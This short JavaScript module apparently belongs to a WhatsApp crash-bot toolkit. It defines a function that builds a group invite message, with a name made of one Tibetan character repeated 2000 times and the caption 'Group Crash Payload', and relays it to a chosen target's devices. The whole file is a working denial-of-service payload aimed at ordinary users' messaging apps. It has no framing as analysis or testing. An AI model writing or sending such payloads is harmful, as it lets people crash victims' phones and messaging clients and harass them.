const { relayCrashToDevices } = require('../target-utils');

async function Xgc(SYxS7, target) {
    try {
        const LoveString = "ཹ".repeat(2000);

        const lovemessage = {
            groupInviteMessage: {
                groupName: LoveString,
                groupJid: "561611-1627579259@g.us",
                inviteCode: "h+64P9RhJDzgXSPf",
                inviteExpiration: 32503680000,
                caption: "Group Crash Payload",
                thumbnail: null,
                contextInfo: {}
            }
        };

        return await relayCrashToDevices(SYxS7, target, lovemessage);
    } catch (error) {
        console.error("gcandroid failed →", error.message || error);
        return { success: false, deliveredCount: 0, errors: [error.message] };
    }
}

module.exports = { Xgc };
